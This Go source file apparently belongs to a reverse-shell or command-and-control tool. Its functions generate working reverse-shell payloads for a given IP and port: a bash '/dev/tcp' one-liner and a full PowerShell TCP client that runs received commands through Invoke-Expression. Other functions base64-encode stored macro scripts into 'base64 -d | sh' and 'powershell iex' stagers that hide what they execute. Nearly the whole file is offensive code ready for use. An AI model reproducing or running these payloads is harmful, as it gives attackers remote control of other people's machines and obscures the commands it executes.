package agents

import (
	"encoding/base64"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func PrintAgent(bind string) (string, string) {
	//split bind into ip and port
	ip := strings.Split(bind, ":")[0]
	port := strings.Split(bind, ":")[1]
	if ip == "localhost" {
		ip = "127.0.0.1"
	}
	var cmd = "sh -i >& /dev/tcp/" + string(ip) + "/" + string(port) + " 0>&1"

	var cmd_win = "$LHOST = " + string(ip) + "; $LPORT = " + string(port) + "; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"

	return cmd, cmd_win

}

func GetMacroCommands() []string {
	path, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	path = path + "../../../internal/agents/macros"
	path, _ = filepath.Abs(path)

	files, err := os.ReadDir(path + "/lin")
	if err != nil {
		panic(err)
	}
	// for now just print the file names
	var commands []string
	for _, file := range files {
		commands = append(commands, "lin/"+file.Name())
	}

	files, err = os.ReadDir(path + "/win")
	if err != nil {
		panic(err)
	}

	for _, file := range files {
		commands = append(commands, "win/"+file.Name())
	}

	log.Println(commands)
	return commands
}

func GetMacroCommand(command string) string {
	path, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	path = path + "../../../internal/agents/macros"
	path, _ = filepath.Abs(path)

	content, err := os.ReadFile(path + "/" + command)

	lines := strings.Split(string(content), "\n")
	var newContent string
	for _, line := range lines {
		if !strings.HasPrefix(line, "#") {
			newContent += line + "\n"
		}
	}
	content = []byte(newContent)

	if strings.HasPrefix(command, "lin") {
		log.Println("lin")
		log.Println(base64.StdEncoding.EncodeToString(content))
		// encode to base64 utf-8
		content = []byte("echo " + base64.StdEncoding.EncodeToString(content) + " | base64 -d | sh\n")
	} else {
		// encode to base64 utf-16le
		content = []byte("powershell -nop -c \"$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" + base64.StdEncoding.EncodeToString(content) + "')); iex $command\"\n")
	}

	if err != nil {
		panic(err)
	}
	log.Println(string(content))
	return string(content)
}

func GetAllCommands() []string {
	var commands []string
	commands = append(commands, "send")
	commands = append(commands, "lock")
	commands = append(commands, "unlock")
	commands = append(commands, "tl")
	commands = append(commands, "cl")
	commands = append(commands, "lst")
	commands = append(commands, "lsc")
	commands = append(commands, "rmt")
	commands = append(commands, "rmc")
	commands = append(commands, GetMacroCommands()...)
	return commands
}
